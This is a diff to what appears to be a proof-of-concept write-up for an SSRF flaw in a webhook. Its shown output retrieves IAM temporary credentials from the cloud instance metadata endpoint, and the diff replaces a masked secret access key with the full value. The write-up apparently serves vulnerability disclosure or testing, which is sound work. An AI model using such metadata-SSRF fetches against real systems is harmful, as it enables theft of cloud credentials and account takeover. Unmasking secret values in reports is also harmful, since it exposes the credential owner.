@@ -42,7 +42,7 @@ python3 poc-ssrf-webhook.py
 [*] role name discovered via metadata SSRF: app-prod-ec2-role
 [*] fetching http://169.254.169.254/latest/meta-data/iam/security-credentials/app-prod-ec2-role
 AccessKeyId:     ASIAABCDEFGHIJKLMNOP                              <-- proof: live temporary credential
-SecretAccessKey: wJalrXUt********************EXAMPLEKEY            <-- masked here, full value in script output
+SecretAccessKey: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
 Token:           IQoJb3JpZ2luX2Vj... (truncated)
 Expiration:      2026-07-06T21:00:00Z
 ```
